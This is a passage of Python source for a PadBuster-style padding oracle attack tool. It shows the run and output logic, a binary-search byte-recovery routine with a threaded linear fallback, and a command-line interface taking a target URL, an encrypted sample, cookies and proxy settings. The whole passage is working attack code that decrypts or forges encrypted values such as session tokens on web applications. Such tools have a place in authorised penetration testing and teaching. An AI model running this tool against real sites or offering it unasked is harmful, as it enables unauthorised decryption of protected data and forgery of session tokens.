        # Note if we're saving state
        if self.config.save_state:
            self.my_print("INFO: State saving is enabled - progress will be saved automatically", 0)
        
        # Run in the appropriate mode
        start_time = time.time()
        
        if self.config.brute_force:
            self.brute_force_mode()
        elif self.config.plaintext_input or self.config.encoded_plaintext_input:
            self.encrypt_mode()
        else:
            self.decrypt_mode()
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # Print the results
        print("-------------------------------------------------------")
        print("** Finished ***\n")
        
        if self.config.plaintext_input or self.config.encoded_plaintext_input:
            print(f"[+] Encrypted value is: {urllib.parse.quote(self.forged_bytes)}")
        else:
            print(f"[+] Decrypted value (ASCII): {self.plain_text_bytes.decode('latin1', errors='replace')}")
            print(f"[+] Decrypted value (HEX): {self.my_encode(self.plain_text_bytes, 2)}")
            print(f"[+] Decrypted value (Base64): {self.my_encode(self.plain_text_bytes, 0)}")
            
        print(f"[+] Total Requests: {self.total_requests}")
        print(f"[+] Total Runtime: {execution_time:.2f} seconds")
        
        if self.config.save_state:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            filename = f"padbuster_final_{timestamp}.json"
            self.save_state(filename)
            print(f"[+] Final state saved to: {filename}")
            
        print("-------------------------------------------------------\n")

    def process_block_binary_search(self, sample_bytes: bytes) -> bytes:
            """Process a block using binary search strategy"""
            # Analysis mode is either 0 (response analysis) or 1 (exploit)
            analysis_mode = 0 if not self.config.error_string and not self.oracle_signature else 1
            
            # If in analysis mode, we need to run the normal search first
            if analysis_mode == 0:
                self.my_print("INFO: Running analysis mode with linear search...", 0)
                return self.process_block_linear_search(sample_bytes)
            
            complete = False
            auto_retry = False
            has_hit = False
            
            while not complete:
                # Reset the return value
                return_value = b""
                
                repeat = False
                
                # TestBytes are the fake bytes prepended to the cipher test for the padding attack
                test_bytes = bytearray(b"\x00" * self.config.block_size)
                
                false_positive_detector = 0
                
                # Create progress bar if enabled
                if self.config.progress_bar and tqdm_available:
                    progress_bar = tqdm(total=self.config.block_size, desc="Processing block (binary search)", unit="byte")
                else:
                    progress_bar = None
                    
                # Work on one byte at a time, starting with the last byte and moving backwards
                byte_num = self.config.block_size - 1
                while byte_num >= 0:
                    # Use binary search to find the correct byte value
                    byte_value = self.binary_search_padding_byte(test_bytes, byte_num, sample_bytes)
                    
                    if byte_value is not None:
                        # Success! We found a valid padding byte
                        self.my_print(f"[+] Success: (binary search) [Byte {byte_num+1}]", 0)
                        self.my_print(f"[+] Test Byte: {urllib.parse.quote(bytes([byte_value]))}", 
                                     1 if self.config.verbose else 0)
                        
                        continue_val = "y"
                        if self.config.interactive:
                            continue_val = input(
                                "Do you want to use this value (Yes/No/All)? [y/n/a]: "
                            ).lower()
                        
                        if continue_val in ["y", "a"]:
                            if continue_val == "a":
                                self.config.interactive = False
                            
                            # Update our test bytes with the successful value
                            test_bytes[byte_num] = byte_value
                            
                            # Calculate the decrypted byte by XORing with the padding value
                            current_padding_byte = self.config.block_size - byte_num
                            next_padding_byte = current_padding_byte + 1
                            
                            # XOR the test byte with the current padding value
                            decrypted_byte = bytes([test_bytes[byte_num] ^ current_padding_byte])
                            self.my_print(
                                f"[+] XORing with Padding Char, which is {urllib.parse.quote(bytes([current_padding_byte]))}",
                                1 if self.config.verbose else 0
                            )
                            
                            return_value = decrypted_byte + return_value
                            self.my_print(
                                f"[+] Decrypted Byte is: {urllib.parse.quote(decrypted_byte)}",
                                1 if self.config.verbose else 0
                            )
                            
                            # Update test bytes for the next round based on the padding
                            for k in range(byte_num, self.config.block_size):
                                # XOR with current padding to recover the decrypted byte
                                test_bytes[k] ^= current_padding_byte
                                # XOR with next padding value
                                test_bytes[k] ^= next_padding_byte
                            
                            # Move to the next byte
                            byte_num -= 1
                            # Update progress bar
                            if progress_bar:
                                progress_bar.update(1)
                        
                    else:
                        # Binary search failed, try linear search as a fallback
                        self.my_print(f"INFO: Binary search failed for byte {byte_num+1}, falling back to linear search", 0)
                        
                        # Use the normal linear search approach for this byte
                        byte_values_to_test = list(range(256))
                        found_match = False
                        
                        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
                            futures = []
                            for value in byte_values_to_test:
                                futures.append(executor.submit(self.test_single_byte, 
                                                             test_bytes, byte_num, value, sample_bytes, 1))
                            
                            for future in concurrent.futures.as_completed(futures):
                                result = future.result()
                                value = result["byte_value"]
                                signature_data = result["signature_data"]
                                
                                # Check if we found a padding oracle
                                oracle_found = False
                                if self.config.error_string and self.config.error_string not in result["content"]:
                                    oracle_found = True
                                elif self.oracle_signature and self.oracle_signature != signature_data:
                                    oracle_found = True
                                    
                                if oracle_found:
                                    # Use the same logic as in linear search
                                    self.my_print(f"[+] Success: ({abs(value-256)}/256) [Byte {byte_num+1}]", 0)
                                    self.my_print(f"[+] Test Byte: {urllib.parse.quote(bytes([value]))}", 
                                                 1 if self.config.verbose else 0)
                                    
                                    continue_val = "y"
                                    if self.config.interactive:
                                        continue_val = input(
                                            "Do you want to use this value (Yes/No/All)? [y/n/a]: "
                                        ).lower()
                                    
                                    if continue_val in ["y", "a"]:
                                        if continue_val == "a":
                                            self.config.interactive = False
                                        
                                        # Update our test bytes with the successful value
                                        test_bytes = bytearray(result["test_bytes"])
                                        
                                        # Calculate the decrypted byte by XORing with the padding value
                                        current_padding_byte = self.config.block_size - byte_num
                                        next_padding_byte = current_padding_byte + 1
                                        
                                        # XOR the test byte with the current padding value
                                        decrypted_byte = bytes([test_bytes[byte_num] ^ current_padding_byte])
                                        self.my_print(
                                            f"[+] XORing with Padding Char, which is {urllib.parse.quote(bytes([current_padding_byte]))}",
                                            1 if self.config.verbose else 0
                                        )
                                        
                                        return_value = decrypted_byte + return_value
                                        self.my_print(
                                            f"[+] Decrypted Byte is: {urllib.parse.quote(decrypted_byte)}",
                                            1 if self.config.verbose else 0
                                        )
                                        
                                        # Update test bytes for the next round based on the padding
                                        for k in range(byte_num, self.config.block_size):
                                            # XOR with current padding to recover the decrypted byte
                                            test_bytes[k] ^= current_padding_byte
                                            # XOR with next padding value
                                            test_bytes[k] ^= next_padding_byte
                                        
                                        found_match = True
                                        break
                            
                            if found_match:
                                byte_num -= 1
                                # Update progress bar
                                if progress_bar:
                                    progress_bar.update(1)
                            else:
                                self.my_print(f"ERROR: No matching response on [Byte {byte_num+1}]", 0)
                                
                                if not auto_retry:
                                    auto_retry = True
                                    self.my_print("       Automatically trying one more time...", 0)
                                    repeat = True
                                    byte_num = -1  # Exit outer loop
                                    break
                                else:
                                    continue_val = input("Do you want to start this block over? (Yes/No)? [y/n]: ").lower()
                                    if continue_val != "n":
                                        self.my_print("INFO: Switching to interactive mode", 0)
                                        self.config.interactive = True
                                        repeat = True
                                        byte_num = -1  # Exit outer loop
                                        break
                
                # Close progress bar
                if progress_bar:
                    progress_bar.close()
                    
                # Save intermediate state if enabled
                if self.config.save_state:
                    self.save_state()
                    
                # If repeat is True, we need to try again
                if repeat:
                    complete = False
                else:
                    complete = True
                    
            return return_value

def main():
    """Parse command line arguments and run the PadBuster tool"""
    parser = argparse.ArgumentParser(
        description="PadBuster.py - Automated script for performing Padding Oracle attacks",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument("url", help="The target URL (and query string if applicable)")
    parser.add_argument("encrypted_sample", 
                      help="The encrypted value you want to test. Must also be present in the URL, PostData or a Cookie")
    parser.add_argument("block_size", type=int, help="The block size being used by the algorithm")
    
    parser.add_argument("--auth", help="HTTP Basic Authentication (username:password)")
    parser.add_argument("--bruteforce", action="store_true", help="Perform brute force against the first block")
    parser.add_argument("--ciphertext", help="CipherText for Intermediate Bytes (Hex-Encoded)")
    parser.add_argument("--cookies", help="Cookies (name1=value1; name2=value2)")
    parser.add_argument("--encoding", type=int, default=0, 
                      help="Encoding Format of Sample (Default 0)\n"
                           "0=Base64, 1=Lower HEX, 2=Upper HEX\n"
                           "3=.NET UrlToken, 4=WebSafe Base64")
    parser.add_argument("--encodedtext", help="Data to Encrypt (Encoded)")
    parser.add_argument("--error", help="Padding Error Message")
    parser.add_argument("--headers", help="Custom Headers (name1::value1;name2::value2)")
    parser.add_argument("--interactive", action="store_true", 
                      help="Prompt for confirmation on decrypted bytes")
    parser.add_argument("--intermediate", help="Intermediate Bytes for CipherText (Hex-Encoded)")
    parser.add_argument("--log", action="store_true", 
                      help="Generate log files (creates folder PadBuster.DDMMYY)")
    parser.add_argument("--noencode", action="store_true", 
                      help="Do not URL-encode the payload (encoded by default)")
    parser.add_argument("--noiv", action="store_true", 
                      help="Sample does not include IV (decrypt first block)")
    parser.add_argument("--plaintext", help="Plain-Text to Encrypt")
    parser.add_argument("--post", help="HTTP Post Data String")
    parser.add_argument("--prefix", help="Prefix bytes to append to each sample (Encoded)")
    parser.add_argument("--proxy", help="Use HTTP/S Proxy (address:port)")
    parser.add_argument("--proxyauth", help="Proxy Authentication (username:password)")
    parser.add_argument("--resume", type=int, help="Resume at this block number")
    parser.add_argument("--usebody", action="store_true", 
                      help="Use response body content for response analysis phase")
    parser.add_argument("--verbose", action="store_true", help="Be Verbose")
    parser.add_argument("--veryverbose", action="store_true", help="Be Very Verbose (Debug Only)")
    parser.add_argument("--threads", type=int, default=10, help="Number of parallel threads (Default: 10)")
    
    # New advanced options
    parser.add_argument("--binary-search", action="store_true", 
                      help="Use binary search method instead of linear search")
    parser.add_argument("--save-state", action="store_true",
                      help="Save state during execution for resuming later")
    parser.add_argument("--resume-file", help="Resume from saved state file")
    parser.add_argument("--timeout", type=int, default=10,
                      help="HTTP request timeout in seconds (Default: 10)")
    parser.add_argument("--pool-size", type=int, default=20,
                      help="HTTP connection pool size (Default: 20)")
    parser.add_argument("--no-smart-retry", action="store_true",
                      help="Disable smart retry with exponential backoff")
    parser.add_argument("--no-progress", action="store_true",
                      help="Disable progress bars")
    
    args = parser.parse_args()
    
    # Convert plaintext to bytes if provided
    plaintext_input = args.plaintext.encode('latin1') if args.plaintext else None
    
    # Create config object
    config = PadBusterConfig(
        url=args.url,
        encrypted_sample=args.encrypted_sample,
        block_size=args.block_size,
        error_string=args.error,
        encoding=args.encoding,
        post_data=args.post,
        cookies=args.cookies,
        headers=args.headers,
        prefix=args.prefix,
        intermediary_input=args.intermediate,
        cipher_input=args.ciphertext,
        plaintext_input=plaintext_input,
        encoded_plaintext_input=args.encodedtext,
        no_encode=args.noencode,
        very_verbose=args.veryverbose,
        proxy=args.proxy,
        proxy_auth=args.proxyauth,
        no_iv=args.noiv,
        auth=args.auth,
        resume_block=args.resume,
        interactive=args.interactive,
        brute_force=args.bruteforce,
        use_body=args.usebody,
        verbose=args.verbose,
        log=args.log,
        max_threads=args.threads
    )
    
    # Set additional parameters separately to avoid constructor issues
    config.search_method = "binary" if args.binary_search else "linear"
    config.save_state = args.save_state
    config.resume_file = args.resume_file
    config.timeout = args.timeout
    config.connection_pool_size = args.pool_size
    config.smart_retry = not args.no_smart_retry
    config.progress_bar = not args.no_progress
    
    # Run PadBuster
    padbuster = PadBuster(config)
    padbuster.run()


if __name__ == "__main__":
    main()
        